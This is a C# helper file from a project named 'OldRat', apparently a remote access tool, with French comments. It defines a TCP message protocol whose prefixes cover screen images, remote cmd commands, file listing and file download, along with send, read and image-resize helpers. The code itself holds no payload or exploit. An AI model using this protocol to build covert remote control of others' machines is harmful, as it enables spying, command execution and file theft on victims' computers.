using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace OldRat.Global
{
    public static class Fonction
    {

        public static bool IsClientConnected(TcpClient client)
        {
            try
            {
                return !(client.Client.Poll(1, SelectMode.SelectRead) && client.Client.Available == 0);
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// prefix des requete possible
        /// </summary>
        public enum Prefix
        {
            /// <summary>
            /// envoie d'une image
            /// </summary>
            IMG,
            /// <summary>
            /// commande cmd
            /// </summary>
            CMD,
            /// <summary>
            /// lecture des fichiers
            /// </summary>
            FIL,
            /// <summary>
            /// telecharger un fichier
            /// </summary>
            DWF
        }

        /// <summary>
        /// envoie le prefix
        /// </summary>
        /// <param name="pref">le prefix</param>
        /// <param name="stream">le stream ou l'envoier</param>
        public static void SendPrefix(Prefix pref, NetworkStream stream)
        {
            byte[] prefix = Encoding.UTF8.GetBytes(pref.ToString()); //converti en tableau de byte
            stream.Write(prefix, 0, prefix.Length); //envoie le tableau
            stream.Flush();
        }

        /// <summary>
        /// envoie la taille d'un tableau de byte
        /// </summary>
        /// <param name="data">le tableau</param>
        /// <param name="stream">lendroit ou envoie</param>
        public static void SendSize(byte[] data, NetworkStream stream)
        {
            byte[] sizeBytes = BitConverter.GetBytes(data.Length); //converti la taille en 4 byte
            stream.Write(sizeBytes, 0, sizeBytes.Length); // Envoie la taille de l'image pour que le destinataire sache combien de bytes lire
            stream.Flush();
        }

        /// <summary>
        /// lit tout les octets nessesaire
        /// </summary>
        /// <param name="stream">le stream sur le quel lire</param>
        /// <param name="buffer">le tableau de bit ou stocker</param>
        /// <param name="size">la taille a lire</param>
        /// <exception cref="IOException">connetion ferme</exception>
        public static void ReadFully(NetworkStream stream, int startposition, byte[] buffer, int size)
        {
            int bytesRead = startposition;
            while (bytesRead < size)
            {
                int read = stream.Read(buffer, bytesRead, size - bytesRead);
                if (read == 0) throw new IOException("Connexion fermee par le client.");
                bytesRead += read;
            }
        }


        /// <summary>
        /// redimensionne l'image pour s'adapter a la bonne taille
        /// </summary>
        /// <param name="img">l'image en question</param>
        /// <param name="width">la largeur de la nouvelle image</param>
        /// <param name="height">la hauteur de la nouvelle image</param>
        /// <returns>la nouvelle image</returns>
        public static Image ResizeImage(Image img, int width, int height)
        {
            //cree une nouvelle image
            Bitmap resizedImg = new Bitmap(width, height);
            using (Graphics gfx = Graphics.FromImage(resizedImg))
            {
                //defini la qualiter
                gfx.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;

                //redimentionne l'image
                gfx.DrawImage(img, 0, 0, width, height);
            }
            return resizedImg;
        }

    }
}
